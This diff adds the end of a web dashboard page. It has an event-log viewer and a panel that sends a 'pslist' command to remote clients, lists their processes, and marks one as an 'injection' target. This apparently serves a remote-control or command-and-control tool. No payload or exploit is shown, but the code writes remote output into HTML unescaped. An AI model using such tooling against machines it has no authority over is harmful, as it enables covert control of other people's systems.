+            const childSpans = logDiv.querySelectorAll('span');
+            childSpans.forEach(span => {
+                span.style.setProperty('font-size', currentFontSize + 'px', 'important');
+            });
+
+            eventLogsOutput.appendChild(logDiv);
+
+            const searchTerm = eventLogsSearch ? eventLogsSearch.value : '';
+            if (!searchTerm) {
+                eventLogsOutput.scrollTop = eventLogsOutput.scrollHeight;
+            }
+
+            if (searchTerm && eventLogsSearch) {
+                const searchTermLower = searchTerm.toLowerCase();
+                if (fullText.toLowerCase().includes(searchTermLower)) {
+                    logDiv.style.display = '';
+                    highlightSearchTerm(logDiv, searchTerm);
+                } else {
+                    logDiv.style.display = 'none';
+                }
+            }
+
+            while (eventLogsOutput.children.length > 500) {
+                eventLogsOutput.removeChild(eventLogsOutput.firstChild);
+            }
+        }
+
+        eventLogsBtn.addEventListener('click', () => {
+            console.log('[DEBUG] Event Logs button clicked');
+            eventLogsSec.classList.toggle('hidden');
+            if (!eventLogsSec.classList.contains('hidden')) {
+                console.log('[DEBUG] Event Logs opened, starting streaming');
+                startEventLogsStreaming();
+            } else {
+                console.log('[DEBUG] Event Logs closed, stopping streaming');
+                stopEventLogsStreaming();
+            }
+        });
+
+        closeEventLogs.addEventListener('click', () => {
+            eventLogsSec.classList.add('hidden');
+            stopEventLogsStreaming();
+        });
+
+        if (clearEventLogs) {
+            clearEventLogs.addEventListener('click', () => {
+                if (eventLogsOutput) {
+                    eventLogsOutput.innerHTML = '<div class="text-slate-500 text-[9px] select-none"><span class="text-green-400">[READY]</span> Logs cleared - waiting for server events...</div>';
+                    setTimeout(() => {
+                        updateEventLogsZoom();
+                    }, 50);
+                }
+            });
+        }
+
+        let eventLogsZoomLevel = 100;
+        const eventLogsContainer = document.getElementById('eventlogs-container');
+        const eventLogsZoomIn = document.getElementById('eventlogs-zoom-in');
+        const eventLogsZoomOut = document.getElementById('eventlogs-zoom-out');
+        const eventLogsZoomLevelSpan = document.getElementById('eventlogs-zoom-level');
+        const eventLogsSearch = document.getElementById('eventlogs-search');
+
+        console.log('[DEBUG] Event Logs elements found:', {
+            eventLogsOutput: !!eventLogsOutput,
+            eventLogsContainer: !!eventLogsContainer,
+            eventLogsZoomIn: !!eventLogsZoomIn,
+            eventLogsZoomOut: !!eventLogsZoomOut,
+            eventLogsZoomLevelSpan: !!eventLogsZoomLevelSpan,
+            eventLogsSearch: !!eventLogsSearch
+        });
+
+        function updateEventLogsZoom() {
+            console.log('[DEBUG] updateEventLogsZoom called with level:', eventLogsZoomLevel);
+
+            const eventLogsOutputElement = document.getElementById('event-logs-output');
+            const eventLogsZoomLevelElement = document.getElementById('eventlogs-zoom-level');
+
+            if (!eventLogsOutputElement) {
+                console.error('[DEBUG] event-logs-output element not found!');
+                return;
+            }
+
+            if (!eventLogsZoomLevelElement) {
+                console.error('[DEBUG] eventlogs-zoom-level element not found!');
+                return;
+            }
+
+            console.log('[DEBUG] Elements found, applying zoom...');
+
+            const baseFontSize = 10;
+            const newFontSize = (eventLogsZoomLevel / 100) * baseFontSize;
+
+            eventLogsOutputElement.style.setProperty('font-size', newFontSize + 'px', 'important');
+
+            const allChildren = eventLogsOutputElement.querySelectorAll('*');
+            allChildren.forEach(child => {
+                child.style.setProperty('font-size', newFontSize + 'px', 'important');
+            });
+
+            eventLogsZoomLevelElement.textContent = eventLogsZoomLevel + '%';
+
+            console.log('[DEBUG] Zoom applied:', {
+                level: eventLogsZoomLevel + '%',
+                fontSize: newFontSize + 'px',
+                childrenCount: allChildren.length
+            });
+        }
+
+        if (eventLogsZoomIn) {
+            console.log('[DEBUG] Adding zoom in event listener');
+            eventLogsZoomIn.addEventListener('click', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                console.log('[DEBUG] Zoom In clicked, current level:', eventLogsZoomLevel);
+                if (eventLogsZoomLevel < 200) {
+                    eventLogsZoomLevel += 10;
+                    updateEventLogsZoom();
+                } else {
+                    console.log('[DEBUG] Maximum zoom level reached');
+                }
+            });
+        } else {
+            console.error('[DEBUG] eventLogsZoomIn button not found!');
+        }
+
+        if (eventLogsZoomOut) {
+            console.log('[DEBUG] Adding zoom out event listener');
+            eventLogsZoomOut.addEventListener('click', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                console.log('[DEBUG] Zoom Out clicked, current level:', eventLogsZoomLevel);
+                if (eventLogsZoomLevel > 50) {
+                    eventLogsZoomLevel -= 10;
+                    updateEventLogsZoom();
+                } else {
+                    console.log('[DEBUG] Minimum zoom level reached');
+                }
+            });
+        } else {
+            console.error('[DEBUG] eventLogsZoomOut button not found!');
+        }
+
+        console.log('[DEBUG] Initializing zoom level...');
+        updateEventLogsZoom();
+
+        window.testZoomIn = function () {
+            console.log('[DEBUG] Test Zoom In called');
+            if (eventLogsZoomLevel < 200) {
+                eventLogsZoomLevel += 10;
+                updateEventLogsZoom();
+            }
+        };
+
+        window.testZoomOut = function () {
+            console.log('[DEBUG] Test Zoom Out called');
+            if (eventLogsZoomLevel > 50) {
+                eventLogsZoomLevel -= 10;
+                updateEventLogsZoom();
+            }
+        };
+
+        const eventLogsSearchCount = document.getElementById('eventlogs-search-count');
+
+        if (eventLogsSearch) {
+            eventLogsSearch.addEventListener('input', (e) => {
+                if (!eventLogsOutput) return;
+
+                const searchTerm = e.target.value.toLowerCase();
+                const logEntries = eventLogsOutput.children;
+                let visibleCount = 0;
+                let totalCount = logEntries.length;
+
+                for (let i = 0; i < logEntries.length; i++) {
+                    const entry = logEntries[i];
+                    const searchText = entry.getAttribute('data-search-text') || entry.textContent.toLowerCase();
+
+                    if (searchTerm === '' || searchText.includes(searchTerm)) {
+                        entry.style.display = '';
+                        visibleCount++;
+                        if (searchTerm !== '') {
+                            highlightSearchTerm(entry, searchTerm);
+                        } else {
+                            removeHighlight(entry);
+                        }
+                    } else {
+                        entry.style.display = 'none';
+                    }
+                }
+
+                if (eventLogsSearchCount) {
+                    if (searchTerm === '') {
+                        eventLogsSearchCount.textContent = '';
+                    } else {
+                        eventLogsSearchCount.textContent = `${visibleCount}/${totalCount}`;
+                    }
+                }
+            });
+        }
+
+        function highlightSearchTerm(element, searchTerm) {
+            const originalText = element.getAttribute('data-original-text') || element.innerHTML;
+            element.setAttribute('data-original-text', originalText);
+
+            const regex = new RegExp(`(${escapeRegExp(searchTerm)})`, 'gi');
+            const highlightedText = originalText.replace(regex, '<span style="background-color: #ffd700; color: #000;">$1</span>');
+            element.innerHTML = highlightedText;
+        }
+
+        function removeHighlight(element) {
+            const originalText = element.getAttribute('data-original-text');
+            if (originalText) {
+                element.innerHTML = originalText;
+                element.removeAttribute('data-original-text');
+            }
+        }
+
+        function escapeRegExp(string) {
+            return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        }
+
+        if (closeEventLogs) {
+            closeEventLogs.addEventListener('click', () => {
+                eventLogsSec.classList.add('hidden');
+                stopEventLogsStreaming();
+                if (eventLogsSearch) {
+                    eventLogsSearch.value = '';
+                }
+                if (eventLogsSearchCount) {
+                    eventLogsSearchCount.textContent = '';
+                }
+                if (eventLogsOutput) {
+                    const logEntries = eventLogsOutput.children;
+                    for (let i = 0; i < logEntries.length; i++) {
+                        removeHighlight(logEntries[i]);
+                        logEntries[i].style.display = '';
+                    }
+                }
+            });
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (!eventLogsSec || eventLogsSec.classList.contains('hidden')) return;
+
+            if (e.ctrlKey && e.key === 'f') {
+                e.preventDefault();
+                if (eventLogsSearch) {
+                    eventLogsSearch.focus();
+                }
+            } else if (e.ctrlKey && (e.key === '+' || e.key === '=')) {
+                e.preventDefault();
+                if (eventLogsZoomIn) {
+                    eventLogsZoomIn.click();
+                }
+            } else if (e.ctrlKey && e.key === '-') {
+                e.preventDefault();
+                if (eventLogsZoomOut) {
+                    eventLogsZoomOut.click();
+                }
+            } else if (e.ctrlKey && e.key === '0') {
+                e.preventDefault();
+                eventLogsZoomLevel = 100;
+                updateEventLogsZoom();
+                console.log('[DEBUG] Event Logs zoom reset to 100%');
+            } else if (e.key === 'Escape' && document.activeElement === eventLogsSearch) {
+                e.preventDefault();
+                if (eventLogsSearch && eventLogsSearchCount) {
+                    eventLogsSearch.value = '';
+                    eventLogsSearchCount.textContent = '';
+                    eventLogsSearch.dispatchEvent(new Event('input'));
+                    eventLogsSearch.blur();
+                }
+            }
+        });
+    </script>
+
+    <script src="/js/dashboard_main.js" defer></script>
+    <script src="/js/client-monitor.js" defer></script>
+    <script src="/js/authentication.js" defer></script>
+    <script src="/js/dashboard.js" defer></script>
+
+    <script>
+        function testDetectClient() {
+            console.log('[TEST] testDetectClient called!');
+
+            const clientRows = document.querySelectorAll('[data-client-id]');
+            console.log('[TEST] Found', clientRows.length, 'client rows');
+
+            let foundClient = null;
+
+            if (window.selectedClientId) {
+                foundClient = window.selectedClientId;
+                console.log('[TEST] Found window.selectedClientId:', foundClient);
+            } else {
+                for (let i = 0; i < clientRows.length; i++) {
+                    const row = clientRows[i];
+                    const clientId = row.getAttribute('data-client-id');
+                    const classes = row.className;
+
+                    console.log(`[TEST] Row ${i}: ${clientId} - ${classes}`);
+
+                    if (classes.includes('bg-blue') || classes.includes('selected')) {
+                        foundClient = clientId;
+                        break;
+                    }
+                }
+
+                if (!foundClient && clientRows.length > 0) {
+                    foundClient = clientRows[0].getAttribute('data-client-id');
+                    console.log('[TEST] Using first client:', foundClient);
+                }
+            }
+
+            if (foundClient) {
+                const targetInfo = document.getElementById('injection-target-info');
+                if (targetInfo) {
+                    targetInfo.innerHTML = `<span class="text-green-400"><i class="fas fa-check-circle mr-2"></i>Client: ${foundClient}</span>`;
+                }
+                console.log('[TEST] Client detected:', foundClient);
+            } else {
+                console.log('[TEST] No client found');
+            }
+        }
+
+        function testRefreshProcesses() {
+            console.log('[TEST] testRefreshProcesses called!');
+
+            const targetInfo = document.getElementById('injection-target-info');
+            let currentClient = null;
+
+            if (targetInfo && targetInfo.textContent.includes('Client:')) {
+                const match = targetInfo.textContent.match(/Client:\s*([^\s]+)/);
+                if (match) {
+                    currentClient = match[1];
+                }
+            }
+
+            if (!currentClient && window.selectedClientId) {
+                currentClient = window.selectedClientId;
+            }
+
+            if (!currentClient) {
+                //alert('No client selected! Please detect a client first using the magnifying glass button.');
+                return;
+            }
+
+            console.log('[TEST] Refreshing processes for client:', currentClient);
+
+            const processContainer = document.getElementById('process-list-container');
+            if (processContainer) {
+                processContainer.innerHTML = `
+                    <div class="text-xs text-slate-500 text-center py-4">
+                        <i class="fas fa-spinner fa-spin mb-2"></i><br>
+                        Loading processes...<br>
+                        <span class="text-xs text-slate-400">This may take a few seconds...</span>
+                    </div>
+                `;
+            }
+
+            sendProcessListCommand(currentClient);
+        }
+
+        async function sendProcessListCommand(clientId) {
+            try {
+                console.log('[TEST] Sending pslist command to client:', clientId);
+
+                if (window.sendCommandToClient && typeof window.sendCommandToClient === 'function') {
+                    console.log('[TEST] Using global sendCommandToClient function');
+                    const result = await window.sendCommandToClient(clientId, 'pslist', true);
+                    if (result && result.success) {
+                        console.log('[TEST] Command sent successfully via global function');
+                        setTimeout(() => fetchProcessResults(clientId), 5000);
+                    } else {
+                        throw new Error('Global sendCommandToClient failed');
+                    }
+                } else {
+                    console.log('[TEST] Using direct command sending');
+                    await sendCommandDirect(clientId, 'pslist');
+                }
+            } catch (error) {
+                console.error('[TEST] Error sending pslist command:', error);
+                const processContainer = document.getElementById('process-list-container');
+                if (processContainer) {
+                    processContainer.innerHTML = '<div class="text-xs text-red-400 text-center py-4"><i class="fas fa-exclamation-triangle mb-2"></i><br>Failed to send command</div>';
+                }
+            }
+        }
+
+        async function sendCommandDirect(clientId, command) {
+            const headers = {
+                'Content-Type': 'application/json'
+            };
+
+            if (window.Auth) {
+                const token = window.Auth.getToken();
+                const csrf = window.Auth.getCSRFToken();
+                if (token && csrf) {
+                    headers['Authorization'] = `Bearer ${token}`;
+                    headers['X-CSRF-Token'] = csrf;
+                }
+            }
+
+            const response = await fetch('/command', {
+                method: 'POST',
+                headers: headers,
+                body: JSON.stringify({
+                    id: clientId,
+                    command: command
+                }),
+                credentials: 'include'
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+
+            const data = await response.json();
+            console.log('[TEST] Command response:', data);
+
+            if (data.status === "Command sent") {
+                setTimeout(() => fetchProcessResults(clientId), 5000);
+            } else {
+                throw new Error('Command not sent: ' + (data.error || 'Unknown error'));
+            }
+        }
+
+        async function fetchProcessResults(clientId, maxRetries = 5, retryDelay = 2000) {
+            console.log('[TEST] Starting fetchProcessResults for client:', clientId);
+
+            const processContainer = document.getElementById('process-list-container');
+            if (processContainer) {
+                processContainer.innerHTML = `
+                    <div class="text-xs text-slate-500 text-center py-4">
+                        <i class="fas fa-search fa-spin mb-2"></i><br>
+                        Waiting for process results...<br>
+                        <span class="text-xs text-slate-400">Attempt 1 of ${maxRetries}...</span>
+                    </div>
+                `;
+            }
+
+            for (let attempt = 1; attempt <= maxRetries; attempt++) {
+                try {
+                    console.log(`[TEST] Attempt ${attempt}/${maxRetries} - Fetching process results for client:`, clientId);
+
+                    if (processContainer && attempt > 1) {
+                        processContainer.innerHTML = `
+                            <div class="text-xs text-slate-500 text-center py-4">
+                                <i class="fas fa-search fa-spin mb-2"></i><br>
+                                Waiting for process results from client: ${clientId}<br>
+                                <span class="text-xs text-slate-400">Attempt ${attempt} of ${maxRetries}...</span>
+                            </div>
+                        `;
+                    }
+
+                    const headers = {};
+                    if (window.Auth) {
+                        const token = window.Auth.getToken();
+                        const csrf = window.Auth.getCSRFToken();
+                        if (token && csrf) {
+                            headers['Authorization'] = `Bearer ${token}`;
+                            headers['X-CSRF-Token'] = csrf;
+                            headers['Content-Type'] = 'application/json';
+                        }
+                    }
+
+                    const response = await fetch('/api/results', {
+                        method: 'GET',
+                        headers: headers,
+                        credentials: 'include'
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+
+                    const data = await response.json();
+                    console.log(`[TEST] Attempt ${attempt} - Results data:`, data);
+
+                    if (data.results && Array.isArray(data.results)) {
+                        const pslistResult = data.results
+                            .filter(r => r.client_id === clientId && r.output &&
+                                (r.output.includes('ProcessId') || r.output.includes('PID') || r.output.includes('Name')))
+                            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
+
+                        if (pslistResult && pslistResult.output) {
+                            console.log(`[TEST] Found pslist result on attempt ${attempt}, parsing...`);
+                            parseAndDisplayProcesses(pslistResult.output);
+                            return;
+                        } else {
+                            console.log(`[TEST] Attempt ${attempt} - No pslist results found yet`);
+
+                            if (attempt === maxRetries) {
+                                if (processContainer) {
+                                    processContainer.innerHTML = `
+                                        <div class="text-xs text-yellow-400 text-center py-4">
+                                            <i class="fas fa-exclamation-triangle mb-2"></i><br>
+                                            No process data received after ${maxRetries} attempts.<br>
+                                            <span class="text-xs text-slate-500">The client may be offline or the command failed.</span>
+                                        </div>
+                                    `;
+                                }
+                                return;
+                            }
+                        }
+                    } else {
+                        throw new Error('Invalid response format');
+                    }
+
+                } catch (error) {
+                    console.error(`[TEST] Attempt ${attempt} - Error fetching results:`, error);
+
+                    if (attempt === maxRetries) {
+                        if (processContainer) {
+                            processContainer.innerHTML = `
+                                <div class="text-xs text-red-400 text-center py-4">
+                                    <i class="fas fa-exclamation-triangle mb-2"></i><br>
+                                    Failed to fetch results: ${error.message}<br>
+                                    <span class="text-xs text-slate-500">Tried ${maxRetries} times</span>
+                                </div>
+                            `;
+                        }
+                        return;
+                    }
+                }
+
+                console.log(`[TEST] Waiting ${retryDelay}ms before attempt ${attempt + 1}...`);
+                await new Promise(resolve => setTimeout(resolve, retryDelay));
+            }
+        }
+
+        function parseAndDisplayProcesses(output) {
+            console.log('[TEST] Parsing process output...');
+            console.log('[TEST] Raw output:', output);
+
+            const processes = [];
+            const lines = output.split('\n');
+
+            let headerFound = false;
+            let headerIndex = -1;
+
+            for (let i = 0; i < lines.length; i++) {
+                const line = lines[i].trim();
+                if (line.toLowerCase().includes('processid') ||
+                    line.toLowerCase().includes('pid') ||
+                    line.toLowerCase().includes('name') ||
+                    line.includes('Node,Name,ParentPid,Pid')) {
+                    headerFound = true;
+                    headerIndex = i;
+                    console.log('[TEST] Found header at line', i, ':', line);
+                    break;
+                }
+            }
+
+            const startIndex = headerFound ? headerIndex + 1 : 0;
+            for (let i = startIndex; i < lines.length; i++) {
+                const line = lines[i].trim();
+                if (!line) continue;
+
+                if (line.includes(',')) {
+                    const parts = line.split(',');
+                    if (parts.length >= 4) {
+                        processes.push({
+                            node: parts[0].trim(),
+                            name: parts[1].trim(),
+                            parentPid: parts[2].trim(),
+                            pid: parts[3].trim()
+                        });
+                    }
+                } else {
+                    const parts = line.split(/\s+/);
+                    if (parts.length >= 2) {
+                        processes.push({
+                            node: '',
+                            name: parts[0],
+                            parentPid: parts.length > 2 ? parts[2] : '',
+                            pid: parts[1]
+                        });
+                    }
+                }
+            }
+
+            console.log('[TEST] Parsed', processes.length, 'processes');
+
+            const processContainer = document.getElementById('process-list-container');
+            if (!processContainer) return;
+
+            if (processes.length === 0) {
+                processContainer.innerHTML = '<div class="text-xs text-slate-500 text-center py-4">No processes found or unable to parse output</div>';
+                return;
+            }
+
+            let html = '';
+            processes.forEach(process => {
+                const processName = process.name || 'Unknown';
+                const processPid = process.pid || 'N/A';
+                const parentPid = process.parentPid || 'N/A';
+
+                html += `
+                    <div class="process-item p-2 hover:bg-slate-700 cursor-pointer rounded text-xs border-b border-slate-600 last:border-b-0" 
+                         data-pid="${processPid}" data-name="${processName}" onclick="selectProcess('${processPid}', '${processName}')">
+                        <div class="flex justify-between">
+                            <span class="text-slate-300 font-medium">${processName}</span>
+                            <span class="text-slate-500">PID: ${processPid}</span>
+                        </div>
+                        ${parentPid !== 'N/A' ? `<div class="text-slate-500 text-[10px]">Parent: ${parentPid}</div>` : ''}
+                    </div>
+                `;
+            });
+
+            processContainer.innerHTML = html;
+
+            const loadingContainer = document.getElementById('process-list-container');
+            if (loadingContainer) {
+                loadingContainer.setAttribute('data-status', 'loaded');
+                loadingContainer.setAttribute('data-count', processes.length.toString());
+            }
+        }
+
+        function selectProcess(pid, name) {
+            console.log('[TEST] Process selected:', name, 'PID:', pid);
+
+            const processItems = document.querySelectorAll('.process-item');
+            processItems.forEach(item => {
+                item.classList.remove('bg-blue-600');
+                item.style.backgroundColor = '';
+            });
+
+            const selectedItem = event.target.closest('.process-item');
+            selectedItem.style.backgroundColor = '#25458d';
+
+            const selectedProcessInfo = document.getElementById('selected-process-info');
+            const selectedProcessDetails = document.getElementById('selected-process-details');
+
+            if (selectedProcessInfo && selectedProcessDetails) {
+                selectedProcessDetails.innerHTML = `
+                    <div><strong>Process:</strong> ${name}</div>
+                    <div><strong>PID:</strong> ${pid}</div>
+                `;
+                selectedProcessInfo.classList.remove('hidden');
+            }
+
+            if (typeof validateInjectButton === 'function') {
+                validateInjectButton();
+            }
+        }
+    </script>
+</body>
+
+</html>
